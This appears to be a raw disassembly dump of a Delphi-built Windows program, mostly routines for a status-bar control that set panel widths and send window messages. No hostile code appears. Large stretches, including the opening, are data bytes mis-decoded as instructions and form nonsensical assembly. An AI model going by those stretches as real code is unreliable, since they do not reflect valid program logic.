popad
jbe r-xdata
add [ eax + 0x340043a4 ] al
pop esp
inc esp
add [ eax - 0x70 ] cl
inc esp
add [ ebp + 0x44 ] cl
add ah dh
cmovb eax [ eax ]
fmul [ edx + eax * 2 ]
add [ ebx + ecx * 4 + 0x41 ] cl
jns r-xdata
outsb
or eax 0x46697661
inc esp
outsd
ja r-xdata
imul eax [ ebp + 0x6c ] 0x46657465
dec esi
outsd
inc esp
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add [ esi + ecx * 4 - 0x2493ffbc ] ah
inc esp
add [ ebx - 0x74b3ffbc ] dl
add [ eax ] dh
arpl [ gs : ecx + 0x63 ] di
insb
or eax 0x44697661
insb
je r-xdata
punpcklwd mm6 [ esi + 0x69 ]
popad
jbe r-xdata
pop esp
sbb eax 0xd80044
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ds
add [ ebx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
add ah dl
or al 0x42
add ah bh
cmovb eax [ eax ]
mov [ edi - 0x297fffbd ] ds
inc esp
add [ eax - 0x17ffbc55 ] dh
fiadd [ eax + eax - 0x58 ]
pop edx
inc esp
add ah bh
rol [ eax + eax + 0x1c ] 0x1
rol [ eax + eax + 0x34 ] 0x1
into
inc esp
add al dh
pop ecx
inc esp
add ah dh
pop ecx
inc esp
add ah ah
mov [ eax + eax + 0x10 ] eax
mov al [ eax + eax + 0x34 ]
inc esp
add [ ebx + ebx * 2 + 0x44 ] ch
add al al
inc sp
add [ eax ] bh
inc sp
add [ ecx + ebp * 2 + 0x44 ] cl
add al bh
inc esp
add [ eax - 0x56 ] ch
inc esp
add [ edx + ecx * 4 - 0x3177ffbc ] dl
inc esp
add [ edi + ecx * 8 + 0x44 ] al
add [ eax - 0x36 ] al
inc esp
add [ eax ] ch
iretd
inc edx
insb
jae r-xdata
inc ecx
imul ebp [ ebp + 0x8 ] 0x436d6f43
je r-xdata
inc esi
pop ebp
inc ebx
add [ eax + 0x2 ] ah
add [ eax ] al
dec esp
sub eax [ eax + eax - 0x24 ]
cmovb eax [ eax ]
jb r-xdata
rcr [ ebx + eax * 2 ] 0x0
inc esi
imul ebp [ esi + 0x64 ] 0x656c6946
insd
jo r-xdata
dec ebp
outsd
jbe r-xdata
imul ebp [ esi + 0x64 ] 0x646c6f46
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x13ffbca3 ] bl
rol al 0x5c
inc ebx
add [ eax ] al
or esp [ ecx + 0x76 ]
imul eax [ ebx + 0x6f ] 0x69467970
insb
push cs
popad
jbe r-xdata
popad
jbe r-xdata
je r-xdata
popad
jbe r-xdata
in al 0x1c
inc esp
add al ah
add [ eax ] al
jmp eax
or [ edx ] eax
mov ah 0x34
inc eax
add ah cl
push edx
mov dl 0x5d
inc ebx
add dh bl
inc ebx
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x21ffbca3 ] dh
jb r-xdata
pop ebp
inc ebx
cwde
pop ebp
inc ebx
add ah ch
inc esi
imul ebp [ esi + 0x64 ] 0x706d6f43
jne r-xdata
lodsb [ esi ]
xor al 0x40
inc esi
imul ebp [ ebp + 0x73 ] 0x6976610b
inc ebx
outsd
jo r-xdata
stosd [ edi ]
arpl [ gs : ecx + 0x63 ] di
inc esi
imul ebp [ ebp + 0xe ] 0x52697661
sub_435d4a
inc esp
add al al
nop
inc esp
add [ edi + edx * 4 + 0x44 ] dl
add ah dh
movsb [ edi ] [ esi ]
inc esp
add [ eax ] cl
inc ebx
add ah bl
mov eax [ 0xffffffffa1040044 ]
inc ebx
add [ ebp - 0x5a6fffbc ] cl
inc esp
add [ eax - 0x5c ] cl
inc esp
add [ eax ] ch
mov eax [ 0xffffffffd0680043 ]
inc esp
add [ eax ] bh
scasb [ edi ]
inc esp
add [ edx + 0x44 ] bl
add ah ah
int3
sub_435d86
inc esp
add ah bh
mov [ 0xffffffffa41c0043 ] eax
inc ebx
add [ esp ] bh
inc ebx
add [ esp + 0x43 ] bl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x20c0040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
xor [ edx ] al
add [ eax ] al
pop es
add [ ebx - 0x7aff7c00 ] al
add [ 0xd004700 ] al
mov al 0x11
mov ebp sub_43a190
mov eax 0xcc0043a1
mov eax [ 0xffffffffa2d80043 ]
inc ebx
add al ah
mov [ 0xffffffffa3940043 ] al
inc ebx
add [ eax + 0x80043a3 ] dh
push esp
inc ecx
outsb
imul ebp [ ebp + 0x61 ] 0xec906574
pop ebp
inc ebx
add [ edi ] al
or [ ecx + eax * 2 + 0x6e ] dl
imul ebp [ ebp + 0x61 ] 0x5cc06574
inc ebx
add [ eax ] al
das
inc esp
add [ edx ] ah
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
insb
jae r-xdata
dec eax
cmpsd [ esi ] [ edi ]
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
insb
add [ eax ] eax
push [ ecx + edx * 8 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
str [ ebx ]
inc edx
outsd
jb r-xdata
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
add [ eax ] dl
inc eax
add [ eax ] cl
add al [ eax ]
push esp
cmpsb [ esi ] [ edi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
sbb [ gs : ebx ] 0x44
add [ ecx ] ah
add bh bh
mov eax 0x5400445a
pop ebx
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax 0x6e410700
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax + 0x14 ] bl
inc esp
add [ ebx ] bl
add bh bh
js r-xdata
insd
insd
outsd
outsb
inc ecx
push esi
dec ecx
sub [ esp + eax * 2 ] bl
add [ eax + eax ] dh
[ esp + ecx * 4 ]
outsd
jb r-xdata
imul eax [ eax + eax + 0x20 ] 0x4469
add [ eax ] al
add [ 0x11ff0000 ] 0x0
add eax 0x6f6c6f43
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc al [ eax ]
or [ ebx + 0x6f ] eax
add [ eax ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ edx ] al
add bh bh
xor al 0xa7
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] al
push es
inc ebx
outsb
je r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ebx
inc ebx
add [ ecx ] dl
add al [ eax ]
dec [ eax - 0x59 ]
jb r-xdata
jb r-xdata
add [ eax ] eax
add [ eax ] al
push ss
add [ esi ] cl
push eax
popad
jb r-xdata
imul ebp [ esi + 0x74 ] 0x4010ac73
add [ edx + eax ] cl
add bh bh
mov esp 0x10043a7
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46080014 ] al
imul ebp [ ebp + 0x4e ] 0x656d61
adc [ eax ] al
pop edx
add [ eax ] al
[ eax ]
jb r-xdata
jb r-xdata
push ds
inc edx
add [ eax ] dh
add bh bh
add al 0x69
inc esp
add [ eax ] ah
imul eax [ eax + eax ] 0x5800000
add [ eax ] al
call [ ecx ]
add [ 0x6f6c6f43 ] al
add [ eax + 0x1 ] al
sbb [ eax ] eax
or dl [ ebx + 0x74 ]
popad
jb r-xdata
outsb
je r-xdata
push edi
add [ eax ] al
inc [ esi - 0x782bffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
inc esi
jb r-xdata
add [ eax ] bh
add al [ eax ]
push [ eax ]
test eax 0x10043
push 0x6948776f
outsb
je r-xdata
pop eax
inc ecx
add [ eax + 0x2 ] bl
add bh bh
pop eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060021 ] al
outsb
push ebx
je r-xdata
bound ebp [ ebp + 0x54 ]
or edx [ edx + esi * 2 + 0x61 ]
outsb
jae r-xdata
insd
cmp al 0x10
inc eax
add [ edx ] bh
add al [ eax ]
jmp [ eax - 0x57 ]
add [ eax ] al
add [ eax ] al
add [ eax ] eax
adc [ eax ] al
and al 0x2
add bh bh
adc al 0xa9
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ ebx ] cl
push edx
jo r-xdata
shl [ ebx + rw-data ] 0xa1
jo r-xdata
outsb
push esp
pop eax
inc ecx
add [ eax + 0x2 ] cl
add bh bh
dec eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07001f ] al
outsb
inc ebx
insb
outsd
add bh bh
push eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070020 ] al
outsb
push ebx
je r-xdata
popad
jb r-xdata
add [ eax ] al
je r-xdata
add [ eax + 0x4f06001e ] al
outsb
dec edi
jo r-xdata
add [ eax ] al
inc eax
add bh bh
or [ eax ] al
add [ eax ] al
mov [ esp + 0x4 ] eax
mov eax esp
call sub_429954
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
jne r-xdata
push esp
pop eax
inc ecx
add [ eax + 0x2 ] dl
jb r-xdata
jae r-xdata
outsb
je r-xdata
jb r-xdata
je r-xdata
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebx
retn
call InitCommonControls
add [ eax ] al
mov eax r-xdata
call sub_40d05c
mov [ rw-data ] eax
cmp [ rw-data ] 0x20
ja r-xdata
push esp
adc [ eax ] al
sbb eax 0x69560700
jae r-xdata
insd
add [ gs : eax ] dl
inc eax
add [ 0x7cff0002 ] dh
test eax 0x10043
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb eax [ eax ]
push es
push esp
imul ebp [ ebp + 0x65 ] 0x10007372
inc eax
add [ esi ] dh
add al [ eax ]
call [ eax + 0x10043a9 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
pop eax
inc ecx
add [ eax + 0x2 ] al
add bh bh
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push esp
jo r-xdata
outsd
outsb
jae r-xdata
mov eax [ rw-data ]
retn
xor eax eax
mov [ rw-data ] eax
adc [ eax ] al
cdq
add [ eax ] al
push [ eax + ebp * 2 + 0x687c0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080018 ] al
push 0x6948776f
outsb
je r-xdata
sbb al [ eax ]
or [ ebx + 0x74 ] edx
outsd
adc [ eax ] al
cmp [ edx ] al
add bh bh
xor [ ecx + 0x10043 ] ch
sub_436150
push ebx
add esp 0xfffffff8
mov [ esp ] 0x8
mov [ esp + 0x4 ] eax
mov eax esp
call sub_429954
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
jne r-xdata
mov eax ebx
pop ecx
pop edx
pop ebx
retn
call InitCommonControls
sub_4361f9
add [ eax ] al
add [ ebx + 0x56 ] dl
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x10 ] 0x32
mov [ esi + 0x15 ] 0x1
mov [ esi + 0x17 ] 0x1
xor edx edx
mov eax esi
call sub_418ea4
mov eax esi
call sub_4362d0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_436248
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418b4c
mov edi esi
mov edx [ edi + 0xc ]
mov eax ebx
call sub_43638c
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_4363b4
mov dl [ edi + 0x14 ]
mov eax ebx
call sub_43635c
mov dl [ edi + 0x15 ]
mov eax ebx
call sub_43636c
mov dl [ edi + 0x18 ]
mov eax ebx
call sub_43637c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4362d0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x17 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_40346c
test eax eax
je r-xdata
mov eax ebx
mov si 0xffff
call sub_40346c
mov eax [ eax + 0x18 ]
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_4362a4
mov [ ebx + 0x17 ] 0x1
sub_436338
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0xc ]
call sub_40403c
cmp [ esi ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_418f48
sub_43638c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx esi
call sub_4043f4
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0xc ]
mov edx esi
call sub_40403c
xor edx edx
mov eax ebx
call sub_418f0c
sub_4363c4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov ecx [ r-xdata ]
xor edx edx
mov eax edi
call sub_419088
mov eax esi
mov edx [ eax ]
call [ edx + 0xd4 ]
mov ecx eax
xor edx edx
mov eax edi
call sub_419088
jmp r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
mov [ edi + 0x18 ] esi
mov eax edi
test bl bl
je r-xdata
sub_436448
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebx + 0x18 ]
call sub_436c18
pop esi
pop ebx
retn
mov eax esi
call sub_418f30
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x18 ]
call sub_436a90
pop esi
pop ebx
retn
sub_436478
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_448d80
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov edx 0xff00000f
mov eax ebx
call sub_446904
mov edx 0x13
mov eax ebx
call sub_445f44
mov dl 0x2
mov eax ebx
call sub_445c78
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x208 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424234
mov esi eax
mov [ ebx + 0x20c ] esi
mov eax esi
mov edx ebx
call sub_445340
mov [ ebx + 0x215 ] 0x1
xor edx edx
mov eax ebx
call sub_446890
mov [ ebx + 0x217 ] 0x1
mov eax ebx
call sub_436a60
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_436530
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax [ esi + 0x20c ]
call sub_403270
mov eax [ esi + 0x208 ]
call sub_403270
mov edx ebx
and dl 0xfc
mov eax esi
call sub_448ea4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_43656c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x4
call sub_436150
mov edx esi
mov eax ebx
call sub_449ee0
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_449e0c
cmp [ ebx + 0x215 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0x216 ] 0x0
jne r-xdata
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
call sub_43af70
call sub_43b050
test al al
je r-xdata
mov al 0x1
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
mov eax [ esi + 0x24 ]
or eax 0x2
or eax 0x1
mov [ esi + 0x24 ] eax
pop esi
pop ebx
retn
sub_4365ef
add [ ebx - 0x75 ] dl
fdiv [ ebx ]
ror [ ebx + 0xa3ce8c3 ] cl
add [ eax ] al
mov eax ebx
call sub_44a00c
mov eax [ ebx + 0x70 ]
call sub_423458
push eax
push 0x0
push 0x2001
mov eax ebx
call sub_44d054
push eax
call SendMessageA
xor ecx ecx
mov dl 0x1
mov eax ebx
call sub_436c18
cmp [ ebx + 0x210 ] 0x0
je r-xdata
cmp [ ebx + 0x214 ] 0x0
je r-xdata
mov eax [ ebx + 0x210 ]
call sub_4044a8
push eax
push 0xff
push 0x401
mov eax ebx
call sub_44d054
push eax
call SendMessageA
pop ebx
retn
push 0x0
push 0x1
push 0x409
mov eax ebx
call sub_44d054
push eax
call SendMessageA
sub_436678
push ebx
cmp [ eax + 0x22a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
mov al 0x1
pop ebx
retn
sub_43669c
push ebx
cmp [ eax + 0x222 ] 0x0
je r-xdata
mov edx ecx
mov eax [ eax + 0x20c ]
call sub_42477c
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
pop ebx
retn
sub_4366dc
push ebx
mov ebx eax
cmp dl [ ebx + 0x214 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x214 ] dl
mov eax ebx
call sub_44d358
test al al
je r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x214 ]
push eax
push 0x409
mov eax ebx
call sub_44d054
push eax
call SendMessageA
sub_436718
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
mov ebx edx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
lea eax [ ebp - 0x1 ]
call sub_443544
mov edx ebx
mov ecx 0x1
mov eax r-xdata
call sub_404590
dec al
jne r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
mov edx ebx
mov ecx 0x1
mov eax r-xdata
call sub_404590
jmp r-xdata
sub_436780
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_40346c
push eax
lea edx [ ebx + 0x210 ]
xor ecx ecx
mov eax ebx
call sub_436718
mov eax ebx
call sub_44d358
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x210 ]
call sub_4044a8
push eax
mov eax ebx
call sub_446d9c
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
or eax 0xff
push eax
push 0x401
mov eax ebx
call sub_44d054
push eax
call SendMessageA
sub_4367e4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x210 ]
mov edx esi
call sub_4043f4
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x210 ]
mov edx esi
call sub_40403c
mov eax ebx
call sub_436780
sub_436810
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44c3d0
mov eax ebx
call sub_44d358
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x214 ] 0x0
jne r-xdata
mov eax ebx
call sub_436780
mov eax [ ebx + 0x208 ]
call sub_4192c0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_436c18
jmp r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_436430
call sub_4362d0
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_436430
cmp [ eax + 0x17 ] 0x0
je r-xdata
sub_436888
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44d358
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x214 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192c0
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_446168
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_436430
mov eax [ eax + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192c0
mov ebx eax
sub ebx 0x2
test ebx ebx
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4363c4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4369e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192c0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192c0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_436430
mov eax [ eax + 0x10 ]
sub [ ebp - 0xc ] eax
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4369e9
mov eax [ ebp - 0x10 ]
call sub_403270
retn
inc ebx
xor esi esi
mov eax [ ebp - 0x10 ]
call sub_436424
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_436430
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192c0
mov edx eax
sub edx esi
dec edx
mov eax [ ebp - 0x10 ]
call sub_436430
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_436430
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_4369e9
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192c0
dec eax
jle r-xdata
mov cl 0x1
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_436c18
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_4192c0
mov edx eax
dec edx
mov eax ebx
call sub_436430
mov edx [ ebp - 0x8 ]
call sub_4363b4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_436430
mov edx [ ebp - 0xc ]
call sub_4363b4
sub_436a60
push ebx
mov ebx eax
cmp [ ebx + 0x217 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax ebx
call sub_446858
mov edx 0xff000012
mov eax [ ebx + 0x68 ]
call sub_423918
sub_436a90
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_436bf0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_44d358
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436bf7
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
mov edx ebx
mov eax [ esi + 0x208 ]
call sub_436430
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
cmp [ ebx + 0x19 ] 0x0
je r-xdata
mov [ ebx + 0x19 ] 0x1
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_418f30
push eax
push 0x40a
mov eax esi
call sub_44d054
push eax
call SendMessageA
push 0xffffffff
lea eax [ ebp - 0x18 ]
push eax
mov eax esi
call sub_44d054
push eax
call InvalidateRect
jmp r-xdata
mov [ ebx + 0x19 ] 0x0
xor edi edi
mov al [ ebx + 0x15 ]
sub al 0x1
jb r-xdata
mov edi 0x100
jmp r-xdata
dec al
je r-xdata
mov eax ebx
call sub_436308
test al al
je r-xdata
mov edi 0x200
jmp r-xdata
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
or edi 0x400
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0xc ]
call sub_404080
mov eax ebx
call sub_436320
test al al
je r-xdata
or edi 0x1000
mov al [ ebx + 0x14 ]
dec al
je r-xdata
mov eax ebx
call sub_436320
push eax
lea edx [ ebp - 0x8 ]
mov cl [ ebx + 0x14 ]
mov eax esi
call sub_436718
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ecx 0x1
mov eax r-xdata
call sub_404590
dec al
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4044a8
push eax
mov eax ebx
call sub_418f30
or edi eax
push edi
push 0x401
mov eax esi
call sub_44d054
push eax
call SendMessageA
lea edx [ ebp - 0x8 ]
mov ecx 0x1
mov eax r-xdata
call sub_404590
jmp r-xdata
sub_436c18
push ebx
push esi
push edi
push ebp
add esp 0xfffffdf4
mov [ esp ] cl
mov ebx edx
mov esi eax
mov eax esi
call sub_44d358
test al al
je r-xdata
add esp 0x20c
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x208 ]
call sub_4192c0
mov [ esp + 0x4 ] eax
test bl bl
je r-xdata
mov ebp [ esp + 0x4 ]
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp + 0x4 ] 0x80
jle r-xdata
inc ebp
xor edi edi
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] 0x80
mov cl [ esp ]
mov edx edi
mov eax esi
call sub_436a90
inc edi
dec ebp
jne r-xdata
xor eax eax
mov [ esp + 0x8 ] eax
mov ebp [ esp + 0x4 ]
sub ebp 0x2
test ebp ebp
jl r-xdata
mov [ esp + 0xc ] 0xffffffff
lea eax [ esp + 0xc ]
push eax
push 0x1
push 0x404
mov eax esi
call sub_44d054
push eax
call SendMessageA
push sub_436d2c
push 0x0
push 0x401
mov eax esi
call sub_44d054
push eax
call SendMessageA
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ esp + eax * 4 + 0x8 ] 0xffffffff
lea eax [ esp + 0xc ]
push eax
mov eax [ esp + 0x8 ]
push eax
push 0x404
mov eax esi
call sub_44d054
push eax
call SendMessageA
inc ebp
xor edi edi
lea ebx [ esp + 0xc ]
mov edx edi
mov eax [ esi + 0x208 ]
call sub_436430
mov eax [ eax + 0x10 ]
add [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
inc edi
add ebx 0x4
dec ebp
jne r-xdata
sub_436d2c
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44c6f4
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax esi
call sub_436a60
cmp eax 0x2a
jne r-xdata
pop esi
pop ebx
retn
sub_436d58
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_42482c
xor eax eax
push ebp
push sub_436e4e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_424ba0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_424a40
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_4240e4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov eax [ eax + 0x14 ]
xor edx edx
call sub_424200
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_436430
mov edx eax
mov eax [ ebp - 0x10 ]
lea ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_40346c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436e55
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
